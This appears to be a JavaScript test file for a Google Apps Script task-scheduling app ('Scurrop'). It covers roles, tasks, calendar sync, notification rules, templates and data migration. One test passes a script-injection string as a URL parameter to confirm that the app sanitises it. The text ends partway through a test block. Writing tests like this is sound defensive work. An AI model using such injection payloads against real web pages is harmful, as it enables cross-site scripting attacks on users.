const { makeEnv } = require('./mock.js');
const env = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const api = env.api;
let pass = 0, fail = 0, s0;
const ok = (name, cond) => { cond ? pass++ : fail++; console.log((cond ? 'PASS ' : 'FAIL ') + name); };
const throws = (name, fn, re) => { try { fn(); ok(name, false); } catch (e) { ok(name + ' → ' + e.message, re.test(e.message)); } };
const day = new Date(); day.setHours(0, 0, 0, 0); const at = (h, m) => day.getTime() + (h * 60 + (m || 0)) * 60000;
env.now = at(8, 0); // サーバー側の時刻を 8:00 に固定する
const todayText = day.getFullYear() + '-' + String(day.getMonth() + 1).padStart(2, '0') + '-' + String(day.getDate()).padStart(2, '0'); // 今日（YYYY-MM-DD）

s0 = api.getState();
ok('始める前は初回ページ用の最小限だけ返る', s0.setup === true && s0.canSetup === true && s0.nameMax === 30 && !s0.tasks);
throws('始める前は他の操作はできない', () => api.createTask({ title: 'x', start: at(9), end: at(10) }), /初期設定/);
ok('setup', /完了/.test(api.setup()));
let s = api.getState();
ok('実行した人が管理者になる', s.me.role === 'admin' && s.members.length === 1);
ok('初期のルールが 6 つ入り（割り当て・遅延・完了がオン）、ボードは空', s.rules.length === 6 && s.boards.length === 0 && s.rules.filter(r => r.enabled).map(r => r.when).join() === 'assign,late,done');
s = api.addMember({ email: 'Sato@Example.com', name: '佐藤 美咲', board: '訪問スタッフ' });
s = api.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: 'ドライバー' });
ok('メンバー追加（メールは小文字に）', s.members.length === 3 && s.members[1].email === 'sato@example.com');
ok('メンバーのボードが一覧に足される（色つき）', s.boards.length === 2 && s.boards[0].name === '訪問スタッフ' && /^#/.test(s.boards[0].color) && s.boards[0].color !== s.boards[1].color);
throws('重複メンバーは拒否', () => api.addMember({ email: 'sato@example.com', name: 'x' }), /登録済み/);
throws('不正なメールは拒否', () => api.addMember({ email: 'abc', name: 'x' }), /メールアドレス/);

s = api.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(11), memo: '高輪 3-12' });
const t1 = s.tasks[0];
ok('タスク作成＋カレンダー', s.tasks.length === 1 && t1.hasEvent && env.events.length === 1);
ok('予定に本人とリンクが入る', env.events[0].o.guests === 'sato@example.com' && env.events[0].o.description.includes('?task=' + t1.id) && env.events[0].o.sendInvites === false); // 招待メールは、初めはオフ（割り当ては Scurrop のメールで知らせる）
throws('終了が開始より前は拒否', () => api.createTask({ title: 'x', start: at(11), end: at(9) }), /時刻/);
throws('未登録メンバーは拒否', () => api.createTask({ title: 'x', member: 'no@example.org', start: at(9), end: at(10) }), /登録されていません/);

s = api.createTask({ title: '配送', member: '', start: at(8, 15), end: at(9), memo: '', geo: true });
const t2 = s.tasks.filter(t => !t.member)[0];
ok('未割り当てで作れる（予定なし）', t2 && !t2.hasEvent && env.events.length === 1);
s = api.assignTask(t2.id, 'takahashi@example.com');
ok('割り当て＋カレンダー', s.tasks.filter(t => t.id === t2.id)[0].member === 'takahashi@example.com' && env.events.length === 2);
throws('二重の割り当ては拒否', () => api.assignTask(t2.id, 'sato@example.com'), /割り当て済み/);

env.user = 'takahashi@example.com';
s = api.getState();
ok('メンバーは自分のタスクだけ見える', s.me.role === 'member' && s.tasks.length === 1 && s.tasks[0].id === t2.id && s.members.length === 1);
throws('他人のタスクは操作できない', () => api.updateTask(t1.id, 'start', {}), /担当ではありません/);
throws('メンバーはタスクを作れない', () => api.createTask({ title: 'x', start: at(9), end: at(10) }), /管理者/);
s = api.updateTask(t2.id, 'start', { note: '出発', geo: { lat: 35.63, lng: 139.73, acc: 18.4 } });
ok('開始（位置つき）', s.tasks[0].status === 'active' && s.history[0].action === 'start' && s.history[0].hasGeo);
throws('二重の開始は拒否', () => api.updateTask(t2.id, 'start', {}), /すでに開始/);
s = api.updateTask(t2.id, 'done', { geoError: 'User denied Geolocation' });
ok('完了（位置が取れない場合も記録）', s.tasks[0].status === 'done' && /位置: 取得失敗/.test(s.history.filter(h => h.action === 'done')[0].note) && !s.history.filter(h => h.action === 'done')[0].hasGeo);
throws('二重の完了は拒否', () => api.updateTask(t2.id, 'done', {}), /すでに完了/);
throws('不正な操作名は拒否', () => api.updateTask(t2.id, 'delete', {}), /できません/);

// リンク
env.user = 'admin@example.com';
const mLink = env.mails.length;
s = api.linkTasks(t1.id, t2.id, '配送', true);
ok('リンクできる', s.links.length === 1 && s.links[0].kind === '配送' && s.notice === '');
ok('両方のメンバーにメールが届く', env.mails.length === mLink + 2 && env.mails[mLink].to === 'sato@example.com' && env.mails[mLink + 1].to === 'takahashi@example.com' && env.mails[mLink].body.includes('?task=' + t1.id));
ok('両方の予定の説明にリンクが入る', /リンク：\n（配送）配送 8:15–9:00 高橋 健/.test(env.events[0].o.description) && /リンク：\n（配送）訪問 9:00–11:00 佐藤 美咲/.test(env.events[1].o.description));
throws('同じ組のリンクは拒否', () => api.linkTasks(t2.id, t1.id, '', false), /すでにリンク/);
throws('自分自身とはリンクできない', () => api.linkTasks(t1.id, t1.id, '', false), /別のタスク/);
env.user = 'takahashi@example.com';
s = api.getState();
ok('メンバーにもリンク先の要約が見える（タスク自体は見えない）', s.tasks.length === 1 && s.links.length === 1 && s.links[0].aInfo.member === '佐藤 美咲');
throws('メンバーはリンクできない', () => api.linkTasks(t1.id, t2.id, '', false), /管理者/);
env.user = 'admin@example.com'; env.mailFail = true;
const t3 = api.createTask({ title: '集荷', member: 'takahashi@example.com', start: at(11), end: at(11, 45) }).tasks.filter(t => t.title === '集荷')[0];
s = api.linkTasks(t1.id, t3.id, '集荷', true);
ok('メールが失敗してもリンクは作られ、理由が返る', s.links.length === 2 && /メールを送信できませんでした/.test(s.notice));
env.mailFail = false;
s = api.unlinkTasks(s.links.filter(l => l.kind === '集荷')[0].id);
ok('リンクを外せる（予定の説明からも消える）', s.links.length === 1 && !/集荷/.test(env.events[0].o.description));

env.user = 'stranger@example.com';
s = api.getState();
ok('未登録の人は guest で何も見えない', s.me.role === 'guest' && s.tasks.length === 0 && s.members.length === 0);
env.user = '';
throws('メールが取れない場合はエラー', () => api.getState(), /アカウントを確認できません/);

env.user = 'admin@example.com'; env.calFail = true;
s = api.createTask({ title: '集荷', member: 'takahashi@example.com', start: at(11), end: at(11, 45) });
ok('カレンダー失敗でもタスクは作られ、理由が返る', s.tasks.length === 4 && /Invalid guest/.test(s.calendarError));
const boot = api.doGet({ parameter: { task: 'abc</script><script>alert(1)' } }).boot;
ok('URL の task は英数字とハイフンだけに削る → ' + boot, JSON.parse(boot).task === 'abcscriptscriptalert1');
ok('JSON で返せる（Date を含まない）', !!JSON.stringify(api.getState()));
// ---------- v0.2: プロジェクト・ボード・ルール ----------
env.user = 'admin@example.com'; env.calFail = false; env.now = at(8, 0);
s = api.setProject({ name: '訪問サービス 東京' });
ok('プロジェクト名を変えられる', s.project.name === '訪問サービス 東京');
s = api.addBoard({ name: '事務', color: '#9334E6' });
ok('ボードを追加できる', s.boards.length === 3 && s.boards[2].name === '事務');
throws('同じ名前のボードは拒否', () => api.addBoard({ name: '事務', color: '#9334E6' }), /同じ名前/);
throws('不正な色は拒否', () => api.addBoard({ name: 'x', color: 'red' }), /色/);
s = api.setMemberBoard('admin@example.com', '事務');
ok('メンバーのボードを変えられる', s.members.filter(m => m.email === 'admin@example.com')[0].board === '事務');
throws('無いボードには移せない', () => api.setMemberBoard('admin@example.com', 'なし'), /ボードが見つかりません/);

// 完了 → リンク先のメンバーに知らせる（初期設定でオン）
let n0 = env.mails.length;
env.user = 'sato@example.com';
s = api.updateTask(t1.id, 'start', {});
ok('開始のルールはオフなので、メールは出ない', env.mails.length === n0);
s = api.updateTask(t1.id, 'done', {});
ok('完了すると、管理者とリンク先（高橋）にメールが出る（完了にした本人には出ない）', env.mails.length === n0 + 2 && env.mails.slice(n0).map(m => m.to).sort().join() === 'admin@example.com,takahashi@example.com' && env.mails.slice(n0).filter(m => m.to === 'takahashi@example.com')[0].body.includes('?task=' + t2.id));
env.user = 'admin@example.com';
s = api.getState();
ok('ルールの実行が履歴に残る', s.history.some(h => h.action === 'rule' && h.task === t1.id && /完了 → .*高橋 健/.test(h.note)));

// 開始のルールをオンにする
const startRule = s.rules.filter(r => r.when === 'start')[0];
s = api.setRule(startRule.id, true);
ok('ルールをオンにできる', s.rules.filter(r => r.when === 'start')[0].enabled === true);
const t5 = api.createTask({ title: '点検', member: 'sato@example.com', start: at(12), end: at(13) }).tasks.filter(t => t.title === '点検')[0];
n0 = env.mails.length;
env.user = 'sato@example.com';
api.updateTask(t5.id, 'start', {});
ok('開始すると、管理者にメールが出る', env.mails.length === n0 + 1 && env.mails[n0].to === 'admin@example.com');

// 開始の遅延（管理者がボードを開いているときに検知する）
env.user = 'admin@example.com'; env.now = at(8, 0);
const t6 = api.createTask({ title: '巡回', member: 'takahashi@example.com', start: at(14), end: at(15) }).tasks.filter(t => t.title === '巡回')[0];
env.now = at(13, 59); api.getState(); // それまでに遅れていた別のタスクの通知を先に済ませる
n0 = env.mails.length;
env.now = at(14, 5); api.getState();
ok('5分の遅れでは動かない', env.mails.length === n0);
env.now = at(14, 11); s = api.getState();
ok('10分を超えると、メンバーと管理者にメールが出る', env.mails.length === n0 + 2 && env.mails.slice(n0).map(m => m.to).sort().join() === 'admin@example.com,takahashi@example.com');
api.getState(); api.getState();
ok('同じ遅れで二度は出ない', env.mails.length === n0 + 2);
ok('遅れの通知が履歴に残る', s.history.some(h => h.action === 'rule' && h.task === t6.id && /開始の遅延/.test(h.note)));

// 未割り当てのルール
n0 = env.mails.length;
api.createTask({ title: '予備', member: '', start: at(16), end: at(17) });
ok('未割り当てのルールはオフなので出ない', env.mails.length === n0);
s = api.addRule({ when: 'unassigned', then: ['notify_admin'] });
ok('ルールを追加できる', s.rules.length === 7);
api.createTask({ title: '予備2', member: '', start: at(16), end: at(17) });
ok('未割り当てのタスクで管理者にメールが出る', env.mails.length === n0 + 1 && env.mails[n0].to === 'admin@example.com');
throws('不正なきっかけは拒否', () => api.addRule({ when: 'x', then: ['notify_admin'] }), /通知の条件/);
throws('相手なしのルールは拒否', () => api.addRule({ when: 'done', then: [] }), /通知先/);
s = api.deleteRule(s.rules[6].id);
ok('ルールを消せる', s.rules.length === 6);

// メールが失敗しても操作は止まらない
env.mailFail = true; env.user = 'sato@example.com';
s = api.updateTask(t5.id, 'done', {});
ok('メールが失敗してもタスクは完了し、失敗が履歴に残る', s.tasks.filter(t => t.id === t5.id)[0].status === 'done');
env.mailFail = false;
env.user = 'takahashi@example.com';
s = api.getState();
ok('メンバーにはルールの一覧を返さない', s.rules.length === 0 && s.boards.length === 3);
throws('メンバーはルールを変えられない', () => api.setRule(startRule.id, false), /管理者/);

// v0.4: テンプレートとフィールド
env.user = 'admin@example.com'; env.now = at(14, 20);
s = api.getState();
ok('テンプレートは最初は空', s.templates.length === 0 && s.tasks.every(t => t.fields.length === 0));
throws('名前なしのテンプレートは拒否', () => api.saveTemplate({ name: '', fields: [] }), /テンプレート名/);
throws('ないボードは拒否', () => api.saveTemplate({ name: 'x', board: 'ない', fields: [] }), /ボード/);
throws('不正な種類は拒否', () => api.saveTemplate({ name: 'x', fields: [{ label: 'a', type: 'video' }] }), /種類/);
throws('選択肢なしの選択は拒否', () => api.saveTemplate({ name: 'x', fields: [{ label: 'a', type: 'select', options: [] }] }), /選択肢/);
throws('フィールドは20個まで', () => api.saveTemplate({ name: 'x', fields: Array.from({ length: 21 }, (_, i) => ({ label: 'f' + i, type: 'text' })) }), /20/);
s = api.saveTemplate({ name: '定期訪問', board: '訪問スタッフ', minutes: 90, fields: [
  { label: '契約番号', type: 'text', by: 'admin', required: true },
  { label: '人数', type: 'number', by: 'admin' },
  { label: '結果', type: 'select', by: 'member', required: true, options: ['完了', '再訪問', '不在'] },
  { label: '対応', type: 'multi', by: 'member', options: ['清掃', '点検'] },
  { label: '次回', type: 'date', by: 'member' },
  { label: 'メモ', type: 'long', by: 'member' }] });
const tpl = s.templates[0];
ok('テンプレートを作れる（キーは自動）', s.templates.length === 1 && tpl.minutes === 90 && tpl.fields.length === 6 && tpl.fields.every(f => /^[A-Za-z0-9]+$/.test(f.key)) && new Set(tpl.fields.map(f => f.key)).size === 6);
throws('同じ名前のテンプレートは拒否', () => api.saveTemplate({ name: '定期訪問', fields: [] }), /同じ名前/);
const key = (label) => tpl.fields.filter(f => f.label === label)[0].key;
throws('ないテンプレートは拒否', () => api.createTask({ title: 'x', start: at(15), end: at(16), templateId: 'nope' }), /テンプレート/);
ok('フィールドはどれも、メンバーが報告のときに入れるものになる（前の版の「管理者」指定は読み替える）', tpl.fields.every(f => f.by === 'member'));
s = api.createTask({ title: '定期訪問', member: 'sato@example.com', start: at(15), end: at(16, 30), templateId: tpl.id, memo: '鍵は管理室\n到着時に連絡', values: { [key('契約番号')]: 'A-1024' } });
const t7 = s.tasks.filter(t => t.title === '定期訪問')[0];
ok('タスクを作るときは必須のフィールドがあっても何も入れなくてよい（値は入らない）。メモは改行ごと残る', t7.fields.length === 6 && Object.keys(t7.values).length === 0 && t7.memo === '鍵は管理室\n到着時に連絡');
ok('メモはカレンダーの予定の説明に入る', /鍵は管理室\n到着時に連絡/.test(env.events[env.events.length - 1].o.description) && env.events[env.events.length - 1].o.location === undefined);
s = api.createTask({ title: '定期訪問2', member: 'sato@example.com', start: at(17), end: at(18), templateId: tpl.id });
const t8 = s.tasks.filter(t => t.title === '定期訪問2')[0];
env.user = 'sato@example.com';
s = api.getState();
ok('メンバーにもフィールドが届く（テンプレートの一覧は届かない）', s.templates.length === 0 && s.tasks.filter(t => t.id === t7.id)[0].fields.length === 6);
api.updateTask(t7.id, 'start', {});
throws('メンバーは必須を入れないと完了できない', () => api.updateTask(t7.id, 'done', { values: { [key('人数')]: 2 } }), /契約番号/);
throws('数値でない値は拒否', () => api.updateTask(t7.id, 'done', { values: { [key('契約番号')]: 'A-1', [key('人数')]: 'abc' } }), /数値/);
throws('選択肢にない値は拒否', () => api.updateTask(t7.id, 'done', { values: { [key('契約番号')]: 'A-1', [key('結果')]: 'その他' } }), /選択/);
throws('日付の形が違えば拒否', () => api.updateTask(t7.id, 'done', { values: { [key('契約番号')]: 'A-1', [key('結果')]: '完了', [key('次回')]: '来週' } }), /日付/);
ok('失敗した完了では状態が変わらない', api.getState().tasks.filter(t => t.id === t7.id)[0].status === 'active');
s = api.updateTask(t7.id, 'done', { values: { [key('契約番号')]: 'A-1024', [key('人数')]: '3', [key('結果')]: '再訪問', [key('対応')]: ['清掃', '点検'], [key('次回')]: '2026-12-01', [key('メモ')]: '鍵は管理室', zzz: 'x' } });
const d7 = s.tasks.filter(t => t.id === t7.id)[0];
ok('完了でメンバーの値が保存される（決めていないキーは入らない）', d7.status === 'done' && d7.values[key('結果')] === '再訪問' && d7.values[key('対応')].join() === '清掃,点検' && d7.values[key('次回')] === '2026-12-01' && d7.values[key('契約番号')] === 'A-1024' && d7.values[key('人数')] === 3 && Object.keys(d7.values).length === 6);
throws('メンバーはテンプレートを作れない', () => api.saveTemplate({ name: 'y', fields: [] }), /管理者/);
env.user = 'admin@example.com';
s = api.updateTask(t8.id, 'done', {});
ok('管理者は必須が空でも完了にできる', s.tasks.filter(t => t.id === t8.id)[0].status === 'done');
s = api.saveTemplate({ id: tpl.id, name: '定期訪問', board: '訪問スタッフ', minutes: 60, fields: tpl.fields.slice(0, 3) });
ok('テンプレートを直せる（キーは保たれ、値は残る）', s.templates.length === 1 && s.templates[0].minutes === 60 && s.templates[0].fields[0].key === key('契約番号') && s.tasks.filter(t => t.id === t7.id)[0].fields.length === 3 && s.tasks.filter(t => t.id === t7.id)[0].values[key('次回')] === '2026-12-01');
s = api.deleteTemplate(tpl.id);
ok('テンプレートを消しても、これまでのタスクのフィールドは残る', s.templates.length === 0 && s.tasks.filter(t => t.id === t7.id)[0].fields.length === 3);
s = api.saveTemplate({ name: '定期訪問', fields: [] });
ok('消したテンプレートと同じ名前で作り直せる', s.templates.length === 1);
env.user = 'takahashi@example.com';

// 古い版からの更新: シートと列が自動で足される（setup の再実行なし）
{ const d = env.sheets.tasks._d; const i = d[0].indexOf('memo'); d[0][i] = 'place'; } // 前の版の「場所」の列
delete env.sheets.rules; delete env.sheets.boards; delete env.sheets.templates;
['template_id', 'values'].forEach(c => { const d = env.sheets.tasks._d; const i = d[0].indexOf(c); d.forEach(r => r.splice(i, 1)); });
const th = env.sheets.tasks._d; const ci = th[0].indexOf('late_notified_ms'); th.forEach(r => r.splice(ci, 1));
env.props.SCHEMA = '1'; env.user = 'admin@example.com';
s = api.getState();
ok('前の版の「場所」は、メモとして読める（メモの列が足される）', api.getState().tasks.some(t => /高輪/.test(t.memo)) && env.sheets.tasks._d[0].indexOf('memo') >= 0 && env.sheets.tasks._d[0].indexOf('place') >= 0);
ok('足りないシートと列が自動で足される', env.sheets.templates && env.sheets.tasks._d[0].indexOf('values') >= 0 && s.templates.length === 0 && s.rules.length === 6 && s.boards.length >= 2 && env.sheets.tasks._d[0].indexOf('late_notified_ms') >= 0 && s.tasks.length > 0);

// v0.7: 日付の切り替え、タスクの変更と削除
{
  const e3 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a3 = e3.api; e3.now = at(8); a3.setup();
  const DAY = 86400000; const dstr = (ms) => { const d = new Date(ms); return d.getFullYear() + '-' + String(d.getMonth() + 1).padStart(2, '0') + '-' + String(d.getDate()).padStart(2, '0'); };
  a3.addMember({ email: 'sato@example.com', name: '佐藤 美咲', board: '訪問スタッフ' });
  a3.addMember({ email: 'takahashi@example.com', name: '高橋 健', board: 'ドライバー' });
  let r = a3.createTask({ title: '明日の訪問', member: 'sato@example.com', start: at(9) + DAY, end: at(10) + DAY });
  ok('明日のタスクは今日の一覧に出ない', r.tasks.length === 0 && r.today === true && r.dayStart === day.getTime());
  r = a3.getState({ day: dstr(at(0) + DAY) });
  ok('日付を指定するとその日のタスクが出る', r.tasks.length === 1 && r.tasks[0].title === '明日の訪問' && r.today === false && r.dayStart === new Date(day.getFullYear(), day.getMonth(), day.getDate() + 1).getTime());
  ok('形の違う日付は今日として扱う', a3.getState({ day: '明日' }).today === true && a3.getState({ day: '2026-13-99x' }).today === true);
  e3.user = 'sato@example.com';
  ok('メンバーも別の日の自分のタスクを見られる', a3.getState({ day: dstr(at(0) + DAY) }).tasks.length === 1 && a3.getState().tasks.length === 0);
  e3.user = 'admin@example.com';
  r = a3.createTask({ title: '訪問', member: 'sato@example.com', start: at(9), end: at(11), memo: '高輪' });
  const v = r.tasks.filter(t => t.title === '訪問')[0];
  r = a3.createTask({ title: '配送', member: 'takahashi@example.com', start: at(8, 15), end: at(9) });
  const o = r.tasks.filter(t => t.title === '配送')[0];
  a3.linkTasks(v.id, o.id, '', false);
  const live = () => e3.events.filter(x => !x.deleted);
  const n0 = e3.events.length;
  r = a3.editTask(v.id, { title: '訪問', member: 'sato@example.com', start: at(10), end: at(12), memo: '高輪' });
  let t = r.tasks.filter(x => x.id === v.id)[0];
  ok('時間を変えると、同じ予定の時間が直る（作り直さないので、取り消しや招待のメールは増えない）', t.start === at(10) && t.end === at(12) && e3.events.length === n0 && live().length === n0 && live().some(x => x.s.getTime() === at(10) && x.e.getTime() === at(12) && x.o.guests === 'sato@example.com' && x.moved === 1));
  ok('直した予定にもリンクが書かれ、リンク先の予定の時間も直る', /リンク：\n配送/.test(live().filter(x => x.title === '訪問' && x.s.getTime() === at(10))[0].o.description) && /リンク：\n訪問 10:00–12:00/.test(live().filter(x => x.title === '配送')[0].o.description));
  ok('変更が履歴に残る', r.history[0].action === 'edit' && /時間 10:00–12:00/.test(r.history[0].note));
  r = a3.editTask(v.id, { title: '訪問', member: 'sato@example.com', start: at(10), end: at(12), memo: '高輪' });
  ok('何も変えなければ予定には触らない', e3.events.length === n0 && live().filter(x => x.title === '訪問')[0].moved === 1);
  r = a3.editTask(v.id, { title: '訪問', member: 'takahashi@example.com', start: at(10), end: at(12), memo: '高輪' });
  ok('メンバーを付け替えると、予定は作り直される（前の人の予定は消え、新しい人に予定）', r.tasks.filter(x => x.id === v.id)[0].member === 'takahashi@example.com' && live().filter(x => x.title === '訪問' && x.s.getTime() === at(10))[0].o.guests === 'takahashi@example.com' && live().length === n0 && e3.events.length === n0 + 1);
  a3.addRule({ when: 'unassigned', then: ['notify_admin'] });
  const m0 = e3.mails.length;
  r = a3.editTask(v.id, { title: '訪問', member: '', start: at(10), end: at(12), memo: '高輪' });
  t = r.tasks.filter(x => x.id === v.id)[0];
  ok('未割り当てに戻せる（予定は消え、未割り当てのルールが動く）', t.member === '' && !t.hasEvent && live().length === n0 - 1 && e3.mails.length === m0 + 1);
  e3.moveFail = true;
  r = a3.editTask(v.id, { title: '訪問', member: '', start: at(10), end: at(12), memo: '高輪' });
  a3.editTask(v.id, { title: '訪問', member: 'sato@example.com', start: at(10), end: at(12), memo: '高輪' });
  const evBefore = e3.events.length;
  r = a3.editTask(v.id, { title: '訪問', member: 'sato@example.com', start: at(10, 30), end: at(12, 30), memo: '高輪' });
  ok('予定をそのまま直せないときは、作り直す', e3.events.length === evBefore + 1 && live().some(x => x.title === '訪問' && x.s.getTime() === at(10, 30)));
  e3.moveFail = false;
  a3.editTask(v.id, { title: '訪問', member: '', start: at(10), end: at(12), memo: '高輪' });
  throws('終了が開始より前の変更は拒否', () => a3.editTask(v.id, { title: '訪問', member: '', start: at(12), end: at(10) }), /時刻/);
  throws('未登録メンバーへの付け替えは拒否', () => a3.editTask(v.id, { title: '訪問', member: 'no@example.org', start: at(10), end: at(12) }), /登録されていません/);
  throws('ないタスクは変えられない', () => a3.editTask('nope', { title: 'x', start: at(10), end: at(12) }), /見つかりません/);
  e3.user = 'sato@example.com';
  throws('メンバーはタスクを変えられない', () => a3.editTask(v.id, { title: 'x', start: at(10), end: at(12) }), /管理者/);
  throws('メンバーはタスクを消せない', () => a3.deleteTask(v.id), /管理者/);
  e3.user = 'admin@example.com';
  // 遅れの通知のあとで時間をずらすと、もう一度遅れを見張る
  r = a3.editTask(v.id, { title: '訪問', member: 'sato@example.com', start: at(8, 30), end: at(9, 30), memo: '高輪' });
  e3.now = at(8, 45); a3.getState(); const m1 = e3.mails.length;
  r = a3.editTask(v.id, { title: '訪問', member: 'sato@example.com', start: at(9), end: at(10), memo: '高輪' });
  e3.now = at(9, 15); a3.getState();
  ok('開始をずらしたタスクは、新しい時刻でもう一度遅れを知らせる', m1 > m0 + 1 && e3.mails.length > m1);
  // テンプレートつきのタスク
  r = a3.saveTemplate({ name: '定期', fields: [{ label: '番号', type: 'text', by: 'admin', required: true }, { label: '結果', type: 'text', by: 'member' }] });
  const tp = r.templates[0]; const kA = tp.fields[0].key;
  r = a3.createTask({ title: '定期', member: 'sato@example.com', start: at(13), end: at(14), templateId: tp.id, memo: '最初' });
  const f = r.tasks.filter(x => x.title === '定期')[0];
  r = a3.editTask(f.id, { title: '定期', member: 'sato@example.com', start: at(13), end: at(14), memo: '直した', values: { [kA]: 'A-2' } });
  ok('変更では必須のフィールドを求めず、値にも触らない。メモは直せて、予定の説明にも入る', r.tasks.filter(x => x.id === f.id)[0].memo === '直した' && Object.keys(r.tasks.filter(x => x.id === f.id)[0].values).length === 0 && /メモ/.test(r.history[0].note) && /直した/.test(live().filter(x => x.title === '定期')[0].o.description));
  a3.updateTask(f.id, 'done', {});
  throws('完了したタスクは変えられない', () => a3.editTask(f.id, { title: 'x', member: '', start: at(13), end: at(14) }), /完了した/);
  // 削除
  const evN = live().length;
  r = a3.deleteTask(v.id);
  ok('タスクを消すと、予定とリンクも消える', !r.tasks.some(x => x.id === v.id) && r.links.length === 0 && live().length === evN - 1 && e3.sheets.links._d.length === 1);
  ok('リンク先の予定からリンクの行が消える', !/リンク/.test(live().filter(x => x.title === '配送')[0].o.description));
  ok('削除が履歴に残る', r.history[0].action === 'delete' && /訪問 9:00–10:00/.test(r.history[0].note));
  throws('消したタスクはもう消せない', () => a3.deleteTask(v.id), /見つかりません/);
  r = a3.deleteTask(f.id);
  ok('完了したタスクも消せる', !r.tasks.some(x => x.id === f.id));
}

// v0.8: メンバーの管理
{
  const e4 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a4 = e4.api; e4.now = at(8); a4.setup();
  a4.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a4.addMember({ email: 'suzuki@example.com', name: '鈴木', board: '訪問' });
  a4.addBoard({ name: '事務', color: '#9334E6' });
  let r = a4.updateMember('sato@example.com', { name: '佐藤 美咲', role: 'admin', board: '事務' });
  let m = r.members.filter(x => x.email === 'sato@example.com')[0];
  ok('名前・ロール・ボードを変えられる', m.name === '佐藤 美咲' && m.role === 'admin' && m.board === '事務');
  throws('名前なしは拒否', () => a4.updateMember('sato@example.com', { name: '', role: 'member' }), /表示名/);
  throws('ないボードは拒否', () => a4.updateMember('sato@example.com', { name: 'x', board: 'ない' }), /ボード/);
  throws('いないメンバーは変えられない', () => a4.updateMember('no@example.org', { name: 'x' }), /見つかりません/);
  e4.user = 'sato@example.com';
  ok('管理者にしたメンバーは管理画面を使える', a4.getState().me.role === 'admin' && a4.getState().members.length === 3);
  r = a4.updateMember('admin@example.com', { name: '山田', role: 'member', board: '' });
  throws('最後の管理者はメンバーに下げられない', () => a4.updateMember('sato@example.com', { name: '佐藤 美咲', role: 'member', board: '事務' }), /管理者が不在/);
  throws('自分自身は外せない', () => a4.removeMember('sato@example.com'), /自分自身/);
  e4.user = 'admin@example.com';
  throws('メンバーは他の人を変えられない', () => a4.updateMember('suzuki@example.com', { name: 'x' }), /管理者/);
  throws('メンバーは他の人を外せない', () => a4.removeMember('suzuki@example.com'), /管理者/);
  e4.user = 'sato@example.com';
  a4.createTask({ title: '済み', member: 'suzuki@example.com', start: at(6), end: at(7) });
  r = a4.createTask({ title: 'これから', member: 'suzuki@example.com', start: at(10), end: at(11) });
  r = a4.createTask({ title: '相手', member: 'admin@example.com', start: at(11), end: at(12) });
  a4.linkTasks(r.tasks.filter(t => t.title === 'これから')[0].id, r.tasks.filter(t => t.title === '相手')[0].id, '', false);
  const liveN = e4.events.filter(x => !x.deleted).length;
  r = a4.removeMember('suzuki@example.com');
  ok('メンバーを外すと一覧から消える', r.members.length === 2 && !r.members.some(x => x.email === 'suzuki@example.com'));
  ok('これからのタスクは未割り当てに戻り、予定が消える。終わった時間のタスクはそのまま', r.tasks.filter(t => t.title === 'これから')[0].member === '' && !r.tasks.filter(t => t.title === 'これから')[0].hasEvent && r.tasks.filter(t => t.title === '済み')[0].member === 'suzuki@example.com' && e4.events.filter(x => !x.deleted).length === liveN - 1);
  ok('リンク先の予定の説明も直る', /未割り当て/.test(e4.events.filter(x => !x.deleted && x.title === '相手')[0].o.description));
  e4.user = 'suzuki@example.com';
  ok('外された人は未登録の扱いになる', a4.getState().me.role === 'guest');
  e4.user = 'sato@example.com';
  throws('外したメンバーには割り当てられない', () => a4.createTask({ title: 'x', member: 'suzuki@example.com', start: at(13), end: at(14) }), /登録されていません/);
  r = a4.addMember({ email: 'suzuki@example.com', name: '鈴木 陽菜', board: '訪問' });
  ok('外したメンバーをもう一度追加できる（行は増えない）', r.members.length === 3 && r.members.filter(x => x.email === 'suzuki@example.com')[0].name === '鈴木 陽菜' && e4.sheets.members._d.length === 4);
}

// ボードの色（テーマの青〜紫のグラデーション）
{
  const e15 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a15 = e15.api; e15.now = at(8); a15.setup();
  ['A', 'B', 'C', 'D', 'E', 'F', 'G'].forEach((b, i) => a15.addMember({ email: 'm' + i + '@example.com', name: 'm' + i, board: b }));
  const cols = a15.getState().boards.map(b => b.color);
  const hue = (h) => { const [r, g, b] = [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16) / 255); const mx = Math.max(r, g, b), mn = Math.min(r, g, b), d = mx - mn; return ((mx === r ? (g - b) / d + (g < b ? 6 : 0) : mx === g ? (b - r) / d + 2 : (r - g) / d + 4) * 60); };
  const contrast = (h) => { const c = [1, 3, 5].map(i => parseInt(h.slice(i, i + 2), 16) / 255).map(v => v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4)); return 1.05 / (0.2126 * c[0] + 0.7152 * c[1] + 0.0722 * c[2] + 0.05); };
  ok('ボードの色は 6 色で、7 つ目からは繰り返す', new Set(cols.slice(0, 6)).size === 6 && cols[6] === cols[0]);
  ok('どの色も青〜紫（色相 200〜250）で、暖色は入っていない', cols.slice(0, 6).every(c => hue(c) >= 200 && hue(c) <= 250));
  ok('どの色も、白い文字が読める濃さ（4.5 以上）', cols.slice(0, 6).every(c => contrast(c) >= 4.5));
  ok('テーマの紺とすみれは、元の色のまま入っている', cols.indexOf('#1F2E38') >= 0 && cols.indexOf('#6965AD') >= 0);
  ok('新しいボードは、隣どうしが似た色にならない順で色が付く（最初は青、次はすみれ）', cols[0] === '#2279B6' && cols[1] === '#6965AD' && cols[2] === '#1F2E38');
}

// ボードの変更と削除、表示する時間、タブの表示
{
  const e5 = makeEnv(process.argv[2] || __dirname + '/../src/Code.gs'); const a5 = e5.api; e5.now = at(8);
  ok('始める前のタブの表示は Scurrop だけ', a5.doGet({}).title === 'Scurrop');
  a5.initProject({ name: '訪問サービス' });
  ok('タブの表示は「Scurrop | プロジェクト名」', a5.doGet({}).title === 'Scurrop | 訪問サービス');
  a5.addMember({ email: 'sato@example.com', name: '佐藤', board: '訪問' });
  a5.addMember({ email: 'suzuki@example.com', name: '鈴木', board: '訪問' });
  a5.addMember({ email: 'taka@example.com', name: '高橋', board: '配送' });
  a5.saveTemplate({ name: '定期', board: '訪問', fields: [] });
  let r = a5.updateBoard('訪問', { name: '訪問スタッフ', color: '#9334E6' });
